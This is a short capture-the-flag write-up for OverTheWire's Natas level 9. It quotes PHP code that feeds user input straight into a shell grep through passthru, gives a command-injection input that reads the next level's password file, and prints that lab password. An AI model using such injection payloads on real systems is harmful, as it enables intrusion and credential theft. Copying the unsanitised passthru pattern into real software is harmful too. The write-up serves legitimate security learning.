# Natas 9 Solution

Natas 9 once again lets us view the source code.

http://natas9.natas.labs.overthewire.org/index-source.html:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

The `passthru` function executes a command. Because the website dosen't sanitize user
input, we can inject bash as the `$key`.
```bash
;cat ../../../../etc/natas_webpass/natas10 #
```
The semicolon ends the `grep` command and starts a new command.
`cat` prints the password file, and the hashtag comments out the 
rest of the line. When we submit this input, we get our password.

**Username: natas10**  
**Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**

